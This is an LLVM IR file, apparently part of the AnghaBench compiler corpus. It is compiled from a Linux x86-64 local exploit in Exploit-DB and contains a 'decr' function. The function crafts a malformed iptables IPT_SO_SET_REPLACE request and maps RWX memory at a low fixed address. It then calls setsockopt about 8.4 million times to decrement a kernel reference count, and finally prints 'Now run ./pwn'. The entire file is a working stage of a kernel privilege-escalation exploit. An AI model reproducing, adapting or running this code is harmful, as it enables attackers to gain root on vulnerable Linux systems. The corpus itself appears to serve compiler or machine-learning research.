; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux_x86-64/local/extr_40049.c_decr.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux_x86-64/local/extr_40049.c_decr.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.ipt_replace = type { i32, i32, i32, i64 }
%struct.ipt_entry = type { i32, i32 }
%struct.xt_entry_match = type { %struct.TYPE_6__ }
%struct.TYPE_6__ = type { i16, %struct.TYPE_5__, %struct.TYPE_4__ }
%struct.TYPE_5__ = type { i32 }
%struct.TYPE_4__ = type { i32 }
%struct.xt_standard_target = type { i32 }

@PF_INET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_RAW = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@MALLOC_SIZE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [7 x i8] c"malloc\00", align 1
@.str.2 = private unnamed_addr constant [5 x i8] c"icmp\00", align 1
@.str.3 = private unnamed_addr constant [57 x i8] c"[!] Decrementing the refcount. This may take a while...\0A\00", align 1
@.str.4 = private unnamed_addr constant [71 x i8] c"[!] Wait for the \22Done\22 message (even if you'll get the prompt back).\0A\00", align 1
@SOL_IP = common dso_local global i32 0, align 4
@IPT_SO_SET_REPLACE = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [25 x i8] c"[+] Done! Now run ./pwn\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @decr(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca %struct.ipt_replace*, align 8
  %9 = alloca %struct.ipt_entry*, align 8
  %10 = alloca %struct.xt_entry_match*, align 8
  %11 = alloca %struct.xt_standard_target*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i8*, align 8
  %14 = alloca i32*, align 8
  %15 = alloca i64*, align 8
  %16 = alloca i64*, align 8
  store i8* %0, i8** %3, align 8
  %17 = load i32, i32* @PF_INET, align 4
  %18 = load i32, i32* @SOCK_RAW, align 4
  %19 = load i32, i32* @IPPROTO_RAW, align 4
  %20 = call i32 @socket(i32 %17, i32 %18, i32 %19)
  store i32 %20, i32* %4, align 4
  %21 = load i32, i32* %4, align 4
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %23, label %25

23:                                               ; preds = %1
  %24 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %112

25:                                               ; preds = %1
  %26 = load i32, i32* @MALLOC_SIZE, align 4
  %27 = call i8* @malloc(i32 %26)
  store i8* %27, i8** %7, align 8
  %28 = load i8*, i8** %7, align 8
  %29 = icmp eq i8* %28, null
  br i1 %29, label %30, label %32

30:                                               ; preds = %25
  %31 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %112

32:                                               ; preds = %25
  %33 = load i8*, i8** %7, align 8
  %34 = load i32, i32* @MALLOC_SIZE, align 4
  %35 = call i32 @memset(i8* %33, i32 0, i32 %34)
  %36 = load i8*, i8** %7, align 8
  %37 = bitcast i8* %36 to %struct.ipt_replace*
  store %struct.ipt_replace* %37, %struct.ipt_replace** %8, align 8
  %38 = load %struct.ipt_replace*, %struct.ipt_replace** %8, align 8
  %39 = getelementptr inbounds %struct.ipt_replace, %struct.ipt_replace* %38, i32 0, i32 0
  store i32 1, i32* %39, align 8
  %40 = load %struct.ipt_replace*, %struct.ipt_replace** %8, align 8
  %41 = getelementptr inbounds %struct.ipt_replace, %struct.ipt_replace* %40, i32 0, i32 1
  store i32 1, i32* %41, align 4
  %42 = load %struct.ipt_replace*, %struct.ipt_replace** %8, align 8
  %43 = getelementptr inbounds %struct.ipt_replace, %struct.ipt_replace* %42, i32 0, i32 2
  store i32 65563, i32* %43, align 8
  %44 = load %struct.ipt_replace*, %struct.ipt_replace** %8, align 8
  %45 = getelementptr inbounds %struct.ipt_replace, %struct.ipt_replace* %44, i32 0, i32 3
  store i64 0, i64* %45, align 8
  %46 = load i8*, i8** %7, align 8
  %47 = getelementptr i8, i8* %46, i64 24
  %48 = bitcast i8* %47 to %struct.ipt_entry*
  store %struct.ipt_entry* %48, %struct.ipt_entry** %9, align 8
  %49 = load %struct.ipt_entry*, %struct.ipt_entry** %9, align 8
  %50 = getelementptr inbounds %struct.ipt_entry, %struct.ipt_entry* %49, i32 0, i32 0
  store i32 74, i32* %50, align 4
  %51 = load %struct.ipt_entry*, %struct.ipt_entry** %9, align 8
  %52 = getelementptr inbounds %struct.ipt_entry, %struct.ipt_entry* %51, i32 0, i32 1
  store i32 24, i32* %52, align 4
  %53 = load i8*, i8** %7, align 8
  %54 = getelementptr i8, i8* %53, i64 24
  %55 = getelementptr i8, i8* %54, i64 8
  %56 = bitcast i8* %55 to %struct.xt_entry_match*
  store %struct.xt_entry_match* %56, %struct.xt_entry_match** %10, align 8
  %57 = load %struct.xt_entry_match*, %struct.xt_entry_match** %10, align 8
  %58 = getelementptr inbounds %struct.xt_entry_match, %struct.xt_entry_match* %57, i32 0, i32 0
  %59 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %58, i32 0, i32 2
  %60 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %59, i32 0, i32 0
  %61 = load i32, i32* %60, align 4
  %62 = call i32 @strcpy(i32 %61, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0))
  %63 = call i64 @mmap(i8* inttoptr (i64 65536 to i8*), i32 4096, i32 7, i32 50, i32 0, i32 0)
  %64 = inttoptr i64 %63 to i8*
  store i8* %64, i8** %13, align 8
  %65 = load i8*, i8** %13, align 8
  %66 = getelementptr i8, i8* %65, i64 88
  %67 = bitcast i8* %66 to i32*
  store i32* %67, i32** %14, align 8
  %68 = load i32*, i32** %14, align 8
  store i32 -2111971059, i32* %68, align 4
  %69 = load %struct.xt_entry_match*, %struct.xt_entry_match** %10, align 8
  %70 = getelementptr inbounds %struct.xt_entry_match, %struct.xt_entry_match* %69, i32 0, i32 0
  %71 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %70, i32 0, i32 1
  %72 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %71, i32 0, i32 0
  %73 = bitcast i32* %72 to i8*
  %74 = getelementptr inbounds i8, i8* %73, i64 4
  %75 = bitcast i8* %74 to i64*
  store i64* %75, i64** %15, align 8
  %76 = load i8*, i8** %13, align 8
  %77 = ptrtoint i8* %76 to i64
  %78 = load i64*, i64** %15, align 8
  store i64 %77, i64* %78, align 8
  %79 = load %struct.xt_entry_match*, %struct.xt_entry_match** %10, align 8
  %80 = getelementptr inbounds %struct.xt_entry_match, %struct.xt_entry_match* %79, i32 0, i32 0
  %81 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %80, i32 0, i32 0
  store i16 -1, i16* %81, align 4
  %82 = load i8*, i8** %7, align 8
  %83 = getelementptr i8, i8* %82, i64 24
  %84 = getelementptr i8, i8* %83, i64 65535
  %85 = getelementptr i8, i8* %84, i64 8
  %86 = bitcast i8* %85 to %struct.xt_standard_target*
  store %struct.xt_standard_target* %86, %struct.xt_standard_target** %11, align 8
  %87 = load %struct.xt_standard_target*, %struct.xt_standard_target** %11, align 8
  %88 = bitcast %struct.xt_standard_target* %87 to i64*
  store i64* %88, i64** %16, align 8
  %89 = load i8*, i8** %13, align 8
  %90 = ptrtoint i8* %89 to i64
  %91 = load i64*, i64** %16, align 8
  store i64 %90, i64* %91, align 8
  %92 = call i32 @printf(i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.3, i64 0, i64 0))
  %93 = call i32 @printf(i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.4, i64 0, i64 0))
  store i32 0, i32* %12, align 4
  br label %94

94:                                               ; preds = %103, %32
  %95 = load i32, i32* %12, align 4
  %96 = icmp ult i32 %95, 8388608
  br i1 %96, label %97, label %106

97:                                               ; preds = %94
  %98 = load i32, i32* %4, align 4
  %99 = load i32, i32* @SOL_IP, align 4
  %100 = load i32, i32* @IPT_SO_SET_REPLACE, align 4
  %101 = load i8*, i8** %7, align 8
  %102 = call i32 @setsockopt(i32 %98, i32 %99, i32 %100, i8* %101, i32 67584)
  store i32 %102, i32* %6, align 4
  br label %103

103:                                              ; preds = %97
  %104 = load i32, i32* %12, align 4
  %105 = add i32 %104, 1
  store i32 %105, i32* %12, align 4
  br label %94

106:                                              ; preds = %94
  %107 = load i32, i32* %4, align 4
  %108 = call i32 @close(i32 %107)
  %109 = load i8*, i8** %7, align 8
  %110 = call i32 @free(i8* %109)
  %111 = call i32 @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.5, i64 0, i64 0))
  store i32 0, i32* %2, align 4
  br label %112

112:                                              ; preds = %106, %30, %23
  %113 = load i32, i32* %2, align 4
  ret i32 %113
}

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @strcpy(i32, i8*) #1

declare dso_local i64 @mmap(i8*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @setsockopt(i32, i32, i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @free(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
